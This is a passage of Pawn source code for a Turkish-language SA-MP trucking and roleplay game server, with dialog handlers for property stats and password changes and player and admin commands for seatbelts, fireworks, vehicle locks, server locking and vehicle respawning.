			format(DialogTitle, 128, "Businesses of player: %s", Name);

			// Ask to which business the player wants to port
			for (new i; i < MAX_BUSINESSPERPLAYER; i++)
			{
				// Get the business-id
			    BusID = APlayerData[OtherPlayer][Business][i];

				// Check if this businessindex is occupied
				if (BusID != 0)
				{
					// Get the business-type
					BusType = ABusinessData[BusID][BusinessType];
					Earnings = (BusinessTransactionTime - ABusinessData[BusID][LastTransaction]) * ABusinessInteriors[BusType][BusEarnings] * ABusinessData[BusID][BusinessLevel];
					format(BusinessList, 1000, "%s{00FF00}%s{FFFFFF} (earnings: $%i)\n", BusinessList, ABusinessData[BusID][BusinessName], Earnings);
				}
				else
					format(BusinessList, 1000, "%s{FFFFFF}%s{FFFFFF}\n", BusinessList, "Empty business-slot");
			}

			// Display the dialog (and allow the player to port there)
			ShowPlayerDialog(playerid, DialogStatsGoBusiness, DIALOG_STYLE_LIST, DialogTitle, BusinessList, "Goto", "Cancel");
		}
	}
*/
	return 1;
}

// Process the chosen house from another player (displays the statistics of the chosen house)
Dialog_StatsHouse(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new OtherPlayer, HouseID, HouseDatabea[2000], BuyableCarIndex, DialogTitle[128], Name[24];

	// Get the other player and chosen HouseID
	OtherPlayer = APlayerData[playerid][DialogOtherPlayer];
	HouseID = APlayerData[OtherPlayer][Houses][listitem];

	// Construct the dialog-title
	GetPlayerName(OtherPlayer, Name, sizeof(Name));
	format(DialogTitle, 128, " %s 'in Evi", Name);

	// Check if this is a valid HouseID
	if (HouseID != 0)
	{
		// Add all data about the house to the dialog
		format(HouseDatabea, sizeof(HouseDatabea), "%s{FFFFFF}Isim: {00FF00}%s\n", HouseDatabea, AHouseData[HouseID][HouseName]);
		if (AHouseData[HouseID][Insurance] == 1)
			format(HouseDatabea, sizeof(HouseDatabea), "%s{FFFFFF}Sigorta: {00FF00}Yes\n", HouseDatabea);
		else
			format(HouseDatabea, sizeof(HouseDatabea), "%s{FFFFFF}Sigorta: {00FF00}No\n", HouseDatabea);

		format(HouseDatabea, sizeof(HouseDatabea), "%s{FFFFFF}Ev Leveli: {00FF00}%i/%i\n", HouseData, AHouseData[HouseID][HouseLevel], AHouseData[HouseID][HouseMaxLevel]);
		format(HouseDatabea, sizeof(HouseDatabea), "%s{FFFFFF}Ev Fiyati: {00FF00}%i\n \n", HouseDatabea, AHouseData[HouseID][HousePrice]);
		format(HouseDatabea, sizeof(HouseDatabea), "%s{FFFFFF}Araclar:\n", HouseDatabea);
		// Add all vehicles to the list
		for (new CarSlot; CarSlot < 11; CarSlot++)
		{
			// Check if the carslot has a vehicle in it
			if (AHouseData[HouseID][VehicleIDs][CarSlot] != 0)
			{
			    // Get the index where the first vehicle is found in the ABuyableVehicles array
			    BuyableCarIndex = VehicleBuyable_GetIndex(GetVehicleModel(AHouseData[HouseID][VehicleIDs][CarSlot]));
			    // Add the name of the vehicle to the list
				if (AVehicleData[AHouseData[HouseID][VehicleIDs][CarSlot]][Clamped] == true)
				    format(HouseDatabea, 500, "%s{00FF00}%s (clamped)\n", HouseDatabea, ABuyableVehicles[BuyableCarIndex][CarName]);
				else
				    format(HouseDatabea, 500, "%s{00FF00}%s\n", HouseDatabea, ABuyableVehicles[BuyableCarIndex][CarName]);
			}
			else
				format(HouseDatabea, 500, TXT_EmptyCarSlot, HouseDatabea);
		}

		// Store the HouseID that was chosen of the other player so the other dialogs can display the statistics further
		APlayerData[playerid][DialogOtherPlayerHouse] = HouseID;

		// Display the dialog (and allow the player to port there)
		ShowPlayerDialog(playerid, DialogStatsGoHouse, DIALOG_STYLE_LIST, DialogTitle, HouseDatabea, "Goto", "Cancel");
	}
	else
	    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}There is no house in this house-slot");

	return 1;
}

// Port to the house that was chosen by the player when viewing stats about a house and choosing "Goto"
Dialog_StatsGoHouse(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new HouseID, CarSlot, Float:x, Float:y, Float:z;

	// Get the HouseID
	HouseID = APlayerData[playerid][DialogOtherPlayerHouse];

	switch (listitem)
	{
	    case 6, 7, 8, 9, 10: // One of the cars in the list
	    {
			// Calculate the CarSlot
			CarSlot = listitem - 6;

			// Check if the carslot has a car in it
			if (AHouseData[HouseID][VehicleIDs][CarSlot] != 0)
			{
				// Get the position of the vehicle
				GetVehiclePos(AHouseData[HouseID][VehicleIDs][CarSlot], x, y, z);
				// Port the player to the vehicle
				SetPlayerPos(playerid, x, y, z);
			}
			else
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}There is no vehicle in this car-slot");
	    }
	    default: // Any other line
		{
			// Port the player to the house entrance
			SetPlayerPos(playerid, AHouseData[HouseID][HouseX], AHouseData[HouseID][HouseY], AHouseData[HouseID][HouseZ]);
		}
	}

	return 1;
}

// Process the chosen business from another player to port to
Dialog_StatsGoBusiness(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new BusIndex, BusID;

	// The listitem directly indicates the business-index
	BusIndex = listitem;
	BusID = APlayerData[APlayerData[playerid][DialogOtherPlayer]][Business][BusIndex];

	// Check if this is a valid business (BusID != 0)
	if (BusID != 0)
	{
		// Get the coordinates of the business's entrance
		SetPlayerPos(playerid, ABusinessData[BusID][BusinessX], ABusinessData[BusID][BusinessY], ABusinessData[BusID][BusinessZ]);
	}
	else
	    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}There is no business in this business-slot");

	return 1;
}

// Process the chosen help-item
Dialog_HelpItemChosen(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new DialogTitle[128];

	// Clear the dialog-message
	format(DialogMsg5000, 5000, "");

	// Set the dialog-title for the help-topic to be shown
	format(DialogTitle, 128, AHelpTopics[listitem]);

	// Select the help-item and create a dialog that displays all text about that item
	for (new i; i < sizeof(AHelpText); i++)
	{
		// Check if this textline belongs to the help-item
		if (AHelpText[i][HelpID] == listitem)
		{
		    // Add all help-textlines to the list
			format(DialogMsg5000, 5000, "%s%s\n", DialogMsg5000, AHelpText[i][HelpText]);
		}
	}

	// Show the help-text in a dialog
	ShowPlayerDialog(playerid, DialogHelpItem, DIALOG_STYLE_MSGBOX, DialogTitle, DialogMsg5000, "Back", TXT_DialogButtonCancel);

	return 1;
}

// Process the help-item (select "Back" or "Cancel"
Dialog_HelpItem(playerid, response)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// If the player chose "Back", re-open the helplist
	HelpList_Create(playerid);

	return 1;
}



// Process the old password of the player
// Process the old password of the player
Dialog_OldPassword(playerid, response, inputtext[])
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;
	new hash[256];
	SHA256_PassHash(inputtext, "", hash, 256);
	// Check if the entered password is the same as the password saved in the player's account
    if (strcmp(APlayerData[playerid][PlayerPassword], hash, false) == 0)
	{
		// Ask the player to enter a new password
		ShowPlayerDialog(playerid, DialogNewPassword, DIALOG_STYLE_INPUT, "Yeni Sifre Gir:", "Yeni Sifreyi buraya girin:", "Tamam", "Iptal");
	}
	else
	    SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Yanlis Sifre girdin");

	return 1;
}

// Process the new password of the player
Dialog_NewPassword(playerid, response, inputtext[])
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Setup local variables
	new Msg[256], hash[256];

	// Check if the entered password is valid (not empty)
    if (strlen(inputtext) > 0)
	{
	    SHA256_PassHash(inputtext, "", hash, 256);
		// Check if the player didn't enter the same password
	    if (strcmp(APlayerData[playerid][PlayerPassword], hash, false) != 0)
		{
			// Store the new password
			SHA256_PassHash(inputtext, "", APlayerData[playerid][PlayerNewPassword], 256);
			// Construct the content of the dialog, which displays the old and new password
			format(Msg, 256, "%sYeni Þifren: \t{00FF00}%s{FFFFFF}\n \n", Msg, inputtext);
			format(Msg, 256, "%sDeðiþtirmek istediðine emin misin?", Msg);

			// Ask the player if he really wants to change his password
			ShowPlayerDialog(playerid, DialogConfirmPassword, DIALOG_STYLE_MSGBOX, "Emin misin?", Msg, "Evet", "Hayir");
		}
		else
		    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Yeni Sifren Eskisi gibi olamaz");
	}
	else
	    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Gecersiz Sifre");

	return 1;
}

// Process the dialog where the player needs to confirm the password-change
Dialog_ConfirmPassword(playerid, response)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Copy the new password to the old one, overwriting the old one
	format(APlayerData[playerid][PlayerPassword], 256, APlayerData[playerid][PlayerNewPassword]);
	// Clear the new password
	format(APlayerData[playerid][PlayerNewPassword], 256, "");

	// Let the player know his password has been changed
    SendClientMessage(playerid, 0xFFFFFFFF, "{00FF00}Sifren Degstirildi");

	// Save the player's account
	Oyuncu_Kaydet(playerid);


	return 1;
}

// ************************************************************************************************************************************************************
// PPC_PlayerCommands
// ************************************************************************************************************************************************************
////////////////////////////////////metin commands
CMD:karakol(playerid, params[])
{
	if(APlayerData[playerid][PlayerJailed] > 0) return SendClientMessage(playerid,-1,"{FF0000}Hapisteyken karakola ýþýnlanamazsýnýz!");
    if (APlayerData[playerid][JobStarted] == true) return SendClientMessage(playerid, -1, "{FF0000}Görev esnasýnda karakola ýþýnlanamazsýnýz!");
	new PolisVar;
	foreach(new i:Player)
	{
	    if(APlayerData[i][LoggedIn] == false) continue;
	    if(APlayerData[i][PlayerClass] == ClassPolice || APlayerData[i][PlayerClass] == ClassFBY)
	    {
	        PolisVar = 1;
	        break;
	    }
	}

	if(PolisVar == 1) return SendClientMessage(playerid,-1,"{FF0000}Oyunda polis varken bu komutu kullanamazsýnýz!");
	if(APlayerData[playerid][PlayerWanted] > 0)
	{
	ShowPlayerDialog(playerid,KARAKOL_SPAWN,DIALOG_STYLE_LIST ,"Karakol Teleport","Los Santos\nSan Fierro\nLas Venturas","Spawn","Iptal");
	}
	else
	{
	SendClientMessage(playerid,-1,"{FF0000} Yýldýzýnýz Yok , Iþýnlanamazsýnýz ");
	}
	return 1;
}

CMD:otomatikvites(playerid, params[])
{
	SendAdminText(playerid, "/otomatikvites", params);
	if(IsPlayerInAnyVehicle(playerid))
	{
	SendClientMessage(playerid,-1,"{FF000} ARACIN ICINDEYKEN VITES TIPINI DEGISTIREMEZSINIZ !!! ");
	}
	else
	{
	SendClientMessage(playerid,-1,"{00FF00} Artýk Bindiniz Tüm Araclar  {ff0000}Otomatik Vites{00FF00} Olacaktir. ");
	SendClientMessage(playerid,-1,"{00FF00} Tekrar Manuel Kullanmak icin {ff0000}'/manuelvites' {00FF00} yazmaniz yeterli olacak. ");
	otovites[playerid] = 1;
	}
	return 1;
}

CMD:otovites(playerid, params[])
{
	SendAdminText(playerid, "/otovites", params);
	if(IsPlayerInAnyVehicle(playerid))
	{
	SendClientMessage(playerid,-1,"{FF000} ARACIN ICINDEYKEN VITES TIPINI DEGISTIREMEZSINIZ !!! ");
	}
	else
	{
	SendClientMessage(playerid,-1,"{00FF00} Artýk Bindiniz Tüm Araclar  {ff0000}Otomatik Vites{00FF00} Olacaktir. ");
	SendClientMessage(playerid,-1,"{00FF00} Tekrar Manuel Kullanmak icin {ff0000}'/manuelvites' {00FF00} yazmaniz yeterli olacak. ");
	otovites[playerid] = 1;
	}
	return 1;
}

CMD:manuelvites(playerid, params[])
{
	SendAdminText(playerid, "/manuelvites", params);
	if(IsPlayerInAnyVehicle(playerid))
	{
	SendClientMessage(playerid,-1,"{FF0000} ARACIN ICINDEYKEN VITES TIPINI DEGISTIREMEZSINIZ !!! ");
	}
	else
	{
	SendClientMessage(playerid,-1,"{00FF00} Artýk Bindiniz Tüm Araclar  {ff0000}Manuel Vites{00FF00} Olacaktir. ");
	SendClientMessage(playerid,-1,"{00FF00} Tekrar Manuel Kullanmak icin {ff0000}'/manuelvites' {00FF00} yazmaniz yeterli olacak. ");
	otovites[playerid] = 0;
	}
	return 1;
}


CMD:kickall(playerid, params[])
{
	if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
	{
		for(new i;i < MAX_PLAYERS;i++)
  		{
  		    if(IsPlayerNPC(i)) continue;
	  		if (APlayerData[i][PlayerLevel] <= 0)
			{
				SendClientMessage(i,-1," Servere Restart Atilacagindan Dolayi Kicklendiniz 10 Saniye Sonra Giriþ Yapabilirsiniz");
				SafeKick(i);
				new Yazi[1000];
				format(Yazi, 1000, "%s Sunucu restartlanmasý nedeniyle atýldý.", GetName(i));
				SqlLogYaz(playerid, 2, Yazi);
			}
			else
			{
 			SendClientMessage(i,-1," Admin Oldugunuz Ýcin Kicklenmediniz.");
			}
		}
	}
	return 1;
}

CMD:polisyazi(playerid, params[])
{
	if(APlayerData[playerid][PlayerClass] == ClassPolice)
	{

		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, -1, "{FF0000}Yazý yazdýrabilmek için bir araçta olmalýsýnýz");
		new yazi[3000];
		if(sscanf(params, "s", yazi)) return SendSyntaxMessage(playerid, "/polisyazi [yazi]");

		new yazdir[256];
		format(yazdir,sizeof(yazdir), "{FFFF00}%s", yazi);
		if(strlen(params) < 50)
		{
			if(polisyazi[playerid] == 1)
			{
				SendClientMessage(playerid,-1,"{FF0000}Zaten Bir Polis Yazýnýz Mevcut");
			}
			else
			{
				PolisLabel[playerid] =  Create3DTextLabel( yazdir, 0xFF0000FF, 0, 0, 0, 40.0, 0, 0);
				Attach3DTextLabelToVehicle(PolisLabel[playerid], GetPlayerVehicleID(playerid), 0.0, 0.0, 1.5);
				SendClientMessage(playerid,-1,"{FFFF00}[BILGI]: {FFFFFF} Basariyla POLIS Yazisi Yazdiniz.");
				polisyazi[playerid] = 1;
			}
		}
		else
		{
			SendClientMessage(playerid,-1,"{FFFF00}[HATA]:{FFFFFF} YAZINIZ COK UZUN ");
		}
	}
	else
	{
		SendClientMessage(playerid,-1,"{FFFF00}[HATA]:{FFFFFF} Polis Degilsiniz.");
	}
	return 1;
}

CMD:akilitle(playerid,params[])
{
	SendAdminText(playerid, "/akilitle", params);
	if(!IsPlayerInAnyVehicle(playerid))
	{
	    SendClientMessage(playerid,0xFF0000FF," Kilit Komutunu Kullanmak Icýn Bir Arac Ýcerisinde Olman Gerekiyor.");
	    return 1;
	}
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	{
	    SendClientMessage(playerid,0xFF0000FF,"{ff0000}Arac Sürücüsü Degilsiniz.");
	    return 1;
	}
	if(VehicleIsLocked[GetPlayerVehicleID(playerid)] == 1)
	{
	    SendClientMessage(playerid,0xFF0000FF,"{ffffff}Aracýnýz Zaten Kilitli Acmak Icýn {ff0000} /akilitac");
	    return 1;
	}
	for(new i; i < MAX_PLAYERS; i++)
	{
	SetVehicleParamsForPlayer(GetPlayerVehicleID(playerid),i,0,1);
	VehicleIsLocked[GetPlayerVehicleID(playerid)] = 1;
	}
	SendClientMessage(playerid,0xFF0000FF,"{ffffff} Aracýnýz {ff0000}Kilitlendi , {ffffff} Acmak Ýcin {ff0000}/akilitac");
	return 1;
}
//kemer Sistemi
CMD:kemer(playerid, params[])
    {
        if(IsPlayerInAnyVehicle(playerid) == 0)
            {
            SendClientMessage(playerid, COLOR_WHITE, "Aracin icinde Degilsin!");
            return 1;
        }
            new string[50 + MAX_PLAYER_NAME];
        if(IsPlayerInAnyVehicle(playerid) == 1 && SeatbeltStatus[playerid] == 0)
            {
            SeatbeltStatus[playerid] = 1;
            if(IsAMotorBike(GetPlayerVehicleID(playerid)))
                    {
                format(string, sizeof(string), "* %s Kaskini Takti.", GetPlayerNameEx(playerid));
                SCBubble(playerid,string,true,0xFFFF00AA,10,5000);
                            SendClientMessage(playerid, COLOR_WHITE, "Kask Takildi.");
            }
            else
                    {
                format(string, sizeof(string), "* %s Kemerini takti.", GetPlayerNameEx(playerid));
                SCBubble(playerid,string,true,0xFFFF00AA,10,5000);
                            SendClientMessage(playerid, COLOR_WHITE, "Kemer Takildi.");
            }

        }
        else if(IsPlayerInAnyVehicle(playerid) == 1 && SeatbeltStatus[playerid] == 1)
            {
            SeatbeltStatus[playerid] = 0;
                    if(IsAMotorBike(GetPlayerVehicleID(playerid)))
                    {
                format(string, sizeof(string), "* %s Kaskini Cikardi.", GetPlayerNameEx(playerid));
                SCBubble(playerid,string,true,0xFFFF00AA,10,5000);
                            SendClientMessage(playerid, COLOR_WHITE, "Kaskini Cikardin.");
            }
            else
                    {
                format(string, sizeof(string), "* %s Kemerini Cikardi.", GetPlayerNameEx(playerid));
                SCBubble(playerid,string,true,0xFFFF00AA,10,5000);
                            SendClientMessage(playerid, COLOR_WHITE, "Kemer Cikartildi.");
            }
        }
        return 1;
}
//firework
CMD:hfyerlestir(playerid, params[])
{
    			if(VIP[playerid] == 1 || YVIP[playerid] == 1)
				{
                if(FireworkTotal == MAX_LAUNCH)
                {
                    SendClientMessage(playerid, 0xFFFFFFAA, "Hata:{FFFFFF}Maximum Sayiya Ulastiniz! Max 5!");
                        return 1;
                }
                if(Fired == 1)
                {
                    SendClientMessage(playerid, 0xFFFFFFAA, "ERROR:{FFFFFF}Yeni Birtane yerlestirmeden önce bekleyiniz!");
                        return 1;
                }
                new string[128];
                format(string, sizeof(string), "%s Havai Fisek Yerlestirdi.", GetPlayerNameEx(playerid));
            new Float:x, Float:y, Float:z, Float:a;
            GetPlayerPos(playerid, x, y, z);
            foreach(Player, i)
                {
                        if(IsPlayerInRangeOfPoint(i, 30, x, y, z)) {
                                SendClientMessage(i, COLOR_YELLOW, string);
                        }
            }
            GetPlayerFacingAngle(playerid, a);
            x += (2 * floatsin(-a, degrees));
        y += (2 * floatcos(-a, degrees));
            Rocket[FireworkTotal] = CreateDynamicObject(3786, x, y, z, 0, 90, 0);
            RocketLight[FireworkTotal] = CreateDynamicObject(354, x, y, z + 1, 0, 90, 0);
                RocketSmoke[FireworkTotal] = CreateDynamicObject(18716, x, y, z - 4, 0, 0, 0);
                nx[FireworkTotal] = x;
                ny[FireworkTotal] = y;
                nz[FireworkTotal] = z;
                RocketExplosions[FireworkTotal] = 0;
                FireworkTotal++;
                }
                return 1;

}
CMD:hfbaslat(playerid, params[])
{
	if(VIP[playerid] == 1 || YVIP[playerid] == 1)
	{
            if(FireworkTotal == 0)
                {
                    SendClientMessage(playerid, 0xFFFFFFAA, "Hata:{FFFFFF}Hicbir Havai Fisek Yok!");
                        return 1;
                }
                if(Fired == 1)
                {
                    SendClientMessage(playerid, 0xFFFFFFAA, "Hata:{FFFFFF}Zaten Fiseklediniz!");
                        return 1;
                }
                for(new i = 0; i < FireworkTotal; i++)
                {
                        CreateExplosion(nx[i] ,ny[i], nz[i], 12, 5);
                        new time = MoveDynamicObject(Rocket[i], nx[i] ,ny[i], nz[i] + RocketHeight, 10);
                        MoveDynamicObject(RocketLight[i], nx[i] ,ny[i], nz[i] + 2 + RocketHeight, 10);
                        MoveDynamicObject(RocketSmoke[i], nx[i] ,ny[i], nz[i] + RocketHeight, 10);
                        SetTimerEx("Firework", time, 0, "i", i);
                }
                Fired = 1;
                }
                return 1;

}
CMD:kemerkontrol(playerid, params[])
    {
        new string[50 + MAX_PLAYER_NAME];
        if(SeatbeltStatus[playerid] == 1)
            {
                format(string, sizeof(string), "* %s Kemer kontrolü yapiyor.", GetPlayerNameEx(playerid));
                    SendClientMessage(playerid, 0xFFFF00AA, "Kemer Takili.");
                    SendClientMessage(playerid, 0xFFFF00AA, "Iyi Yolculuklar.");
            }
            else
            {
                format(string, sizeof(string), "* %s Kemer Kontrolü Yapiyor.", GetPlayerNameEx(playerid));
                SendClientMessage(playerid, 0xFFFF00AA, "Kemerin Takili degil!");
                SendClientMessage(playerid, 0xFFFF00AA, "Biran önce Bir kaza Yapmadan Kemerini tak.");
            }
            return 1;
}
stock GetPlayerNameEx(playerid) {

            new
                    sz_playerName[MAX_PLAYER_NAME],
                    i_pos;

            GetPlayerName(playerid, sz_playerName, MAX_PLAYER_NAME);
            while ((i_pos = strfind(sz_playerName, "_", false, i_pos)) != -1) sz_playerName[i_pos] = ' ';
            return sz_playerName;
}


stock IsAMotorBike(carid) {
            switch(GetVehicleModel(carid)) {
                    case 509, 510, 462, 448, 581, 522, 461, 521, 523, 463, 586, 468, 471: return 1;
            }
            return 0;
}


stock SCBubble(playerid,stringtext[],bool:selftext,color,range,time)
    {
            SetPlayerChatBubble(playerid,stringtext,color,range,time);
            if(selftext)
            {
                    if(strlen(stringtext) > 64)
                    {
                            new strings1[65];
                            strmid(strings1,stringtext,64,128);
                            strdel(stringtext,64,128);
                            format(stringtext,66,"%s-",stringtext);
                            format(strings1,66,"-%s",strings1);
                            SendClientMessage(playerid,color,stringtext);
                            SendClientMessage(playerid,color,strings1);
                    }
                    else SendClientMessage(playerid,color,stringtext);
            }
            return 1;
}
//buraya kadar kemer

//sunuucu kilitle
CMD:sunucukilitle(playerid,params[])
{
	if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
	{
		SendRconCommand("password komutlukilit");
		SendClientMessageToAll(-1,"{00ff00} Sunucu Kilitlendi ");
	}
	return 1;
}

CMD:sunucukilitac(playerid,params[])
{
	if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
	{
		SendRconCommand("password 0");
		SendClientMessageToAll(-1,"{00ff00} Sunucu ACILDI ");
	}
	return 1;
}
//odulall
CMD:odulall(playerid,params[])
{
	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
	if (APlayerData[playerid][PlayerLevel] >= 5 || Root[playerid] == 1)
	{
	    foreach(new i:Player)
	    {
			RewardPlayer(i, 15000, 1);
	    }
		SendClientMessageToAll(-1, "{F8F8FF}Oyuncularýmýza teþekkür ederiz. Herkese 15.000$ ve 1 skor daðýtýlacak");
	}
	}
	return 1;
}
CMD:respawncars(playerid,params[])
{
	SendAdminText(playerid, "/respawncars", params);

    if (APlayerData[playerid][PlayerLevel] >= 1 || Root[playerid] == 1)
	{
        SetEmptyVehiclesToRespawn();
        SendClientMessageToAll(-1,"{00ff00} Kullanilmayan Tüm Araclar Re-Spawn Edildi ");
	}
	return 1;
}

stock SetEmptyVehiclesToRespawn()
{
    new bool:activeveh[MAX_VEHICLES + 1], tempveh;

    for(new i; i < MAX_PLAYERS; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(!IsPlayerInAnyVehicle(i)) continue;
            tempveh = GetPlayerVehicleID(i);
            activeveh[tempveh] = true;
        }
    }
	new TrailerinAmk[MAX_VEHICLES];


	for(new a = 0; a < (MAX_VEHICLES + 1); a++)
 	{
 	    if(GetVehicleModel(a) == 0) continue;
 		if(IsTrailerAttachedToVehicle(a) && activeveh[a])
		{
 			TrailerinAmk[GetVehicleTrailer(a)] = 1;
	 		continue;
		}
 	}

	for(new v = 0; v < (MAX_VEHICLES + 1); v++)
 	{
  	    if(GetVehicleModel(v) == 0) continue;
		if(!activeveh[v] && TrailerinAmk[v] == 0)
		{
		    if(!IsVehicleMesleked(v))
		    {
				SetVehicleToRespawn(v);
				MotorMOD[v] = 0;
			}
            //RESirketArabaControl();
  		}
    }
    return 1;
}

IsVehicleMesleked(vehicleid)
{
	new Sonuc = 0;
	foreach(new playerid : Player)
	{
	    if(APlayerData[playerid][JobStarted] == false) continue;
	    if(APlayerData[playerid][TrailerID] == vehicleid || APlayerData[playerid][VehicleID] == vehicleid)
	    {
	        Sonuc = 1;
	        break;
	    }
	}
	return Sonuc;
}

CMD:akilitac(playerid,params[])
{
	SendAdminText(playerid, "/akilitac", params);
	if(!IsPlayerInAnyVehicle(playerid))
	{
	    SendClientMessage(playerid,0xFF0000FF," Kilit Komutunu Kullanmak Icýn Bir Arac Ýcerisinde Olman Gerekiyor.");
	    return 1;
	}
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	{
	    SendClientMessage(playerid,0xFF0000FF,"{ff0000}Arac Sürücüsü Degilsiniz.");
	    return 1;
	}
	if(VehicleIsLocked[GetPlayerVehicleID(playerid)] == 0)
	{
	    SendClientMessage(playerid,0xFF0000FF,"{ffffff}Aracýnýz Zaten Kilitli Degil");
	    return 1;
	}
	for(new i; i < MAX_PLAYERS; i++)
	{
	SetVehicleParamsForPlayer(GetPlayerVehicleID(playerid),i,0,0);
	VehicleIsLocked[GetPlayerVehicleID(playerid)] = 0;
	}
	SendClientMessage(playerid,0xFF0000FF,"{ffffff} Aracýnýz {00ff00}Kiliti Acýldý ,{ffffff} Tekrar Kilitlemek Ýcin {00ff00}/akilitle");
	return 1;
}


CMD:tiryazi(playerid, params[])
{
	if(APlayerData[playerid][PlayerClass] == ClassTruckDriver)
	{

		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, -1, "{FF0000}Yazý yazdýrabilmek için bir araçta olmalýsýnýz");
		new yazi[3000];
		if(sscanf(params, "s", yazi)) return SendSyntaxMessage(playerid, "/tiryazi [yazi]");

		new yazdir[256];
		format(yazdir,sizeof(yazdir), "{FFFF00}%s", yazi);
		if(strlen(params) < 50)
		{
			if(polisyazi[playerid] == 1)
			{
				SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Zaten Bir Týr Yazýnýz Mevcut");
			}
			else
			{
				TirciLabel[playerid] =  Create3DTextLabel( yazdir, 0xFF0000FF, 0, 0, 0, 40.0, 0, 0);
				Attach3DTextLabelToVehicle(TirciLabel[playerid], GetPlayerVehicleID(playerid), 0.0, 0.0, 1.5);
				SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Basariyla TIR Yazisi Yazdiniz.");
				polisyazi[playerid] = 1;
			}
		}
		else
		{
			SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}YAZINIZ COK UZUN ");
		}
	}
	else
	{
		SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Tirci Degilsiniz.");
	}
	return 1;
}

CMD:otobusyazi(playerid, params[])
{
	if(APlayerData[playerid][PlayerClass] == ClassBusDriver)
	{

		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, -1, "{FF0000}Yazý yazdýrabilmek için bir araçta olmalýsýnýz");
		new yazi[3000];
		if(sscanf(params, "s", yazi)) return SendSyntaxMessage(playerid, "/otobusyazi [yazi]");

		new yazdir[256];
		format(yazdir,sizeof(yazdir), "{FFFF00}%s", yazi);
		if(strlen(params) < 50)
		{
			if(polisyazi[playerid] == 1)
			{
				SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Zaten Bir Otobüs Yazýnýz Mevcut");
			}
			else
			{
				TirciLabel[playerid] =  Create3DTextLabel( yazdir, 0xFF0000FF, 0, 0, 0, 40.0, 0, 0);
				Attach3DTextLabelToVehicle(TirciLabel[playerid], GetPlayerVehicleID(playerid), 0.0, 0.0, 1.5);
				SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Basariyla Otobus Yazisi Yazdiniz.");
				polisyazi[playerid] = 1;
			}
		}
		else
		{
			SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}YAZINIZ COK UZUN ");
		}
	}
	else
	{
		SendClientMessage(playerid,-1,"{FFCC00}» {FFFFFF}Otobüscü Degilsiniz.");
	}
	return 1;
}


CMD:ogorev(playerid, params[])
{
	new OtherPlayer;
	new yazii[255];

	SendAdminText(playerid, "/ogorev", params);


	if (sscanf(params, "u", OtherPlayer)) SendSyntaxMessage(playerid, "/ogorev <ID>");
			else
			{
				format(yazii, 255, "{FFCC00}» {FFFFFF}Gorev Baslangic Yeri: {FFCC00} %s {FFFFFF}  /// Gorev Bitis Yeri: {FFCC00} %s {FF0000}",ALocations[APlayerData[OtherPlayer][JobLoc1]][LocationName],ALocations[APlayerData[OtherPlayer][JobLoc2]][LocationName]);
   				SendClientMessage(playerid, -1, yazii);
			}

	return 1;
}


CMD:yerbul(playerid, params[])
{
    KillTimer(loc_timer[playerid]);
    KillTimer(loc_timer2[playerid]);
    SetPlayerMarkerForPlayer(playerid, oldid[playerid], GetPlayerColor(playerid));
    new name[MAX_PLAYER_NAME], string[24+MAX_PLAYER_NAME];
    if(! sscanf(params, "i", oldid[playerid]))
    {
        if(oldid[playerid] <= MAX_PLAYER_NAME)
        {
	        if(IsPlayerConnected(oldid[playerid]))
	        {
				locvarmi[playerid] = true;
    			loc_timer2[playerid] = SetTimerEx("locplayers2", 3000, true, "i", playerid);
   			 	loc_timer[playerid] = SetTimerEx("locplayers", 2000, true, "i", playerid);
   			 	SendClientMessage(playerid, 0xFF0000FF, "Aradýgýnýz Oyuncu Haritada Yanýp Sonecektir. Durdurmak icin tekrar komutu ugulayýnýz");
	    	}
	    	else
	    	{
	    	    SendClientMessage(playerid, 0xFF0000FF, "Böyle bir oyuncu bulunamadý");
	    	    SetPlayerMarkerForPlayer(playerid, oldid[playerid], GetPlayerColor(playerid));
	    	}
		}
		else
		{
		    SendClientMessage(playerid, 0xFF0000FF, "Komutun Kullanýmý /yerbul [Playerid]");
		    SetPlayerMarkerForPlayer(playerid, oldid[playerid], GetPlayerColor(playerid));
  		}
    }
    else
    {
        if(locvarmi[playerid] == true)
        {
			GetPlayerName(oldid[playerid], name, sizeof(name));
	 		format(string, sizeof(string), "%s isimli oyuncunun yerini görmeyi durdurdunuz.", name);
			SendClientMessage(playerid, 0xFF0000FF, string);
			locvarmi[playerid] = false;
		}
    }
    return 1;
}

CMD:gopos(playerid, params[])
{
	SendAdminText(playerid, "/gopos", params);
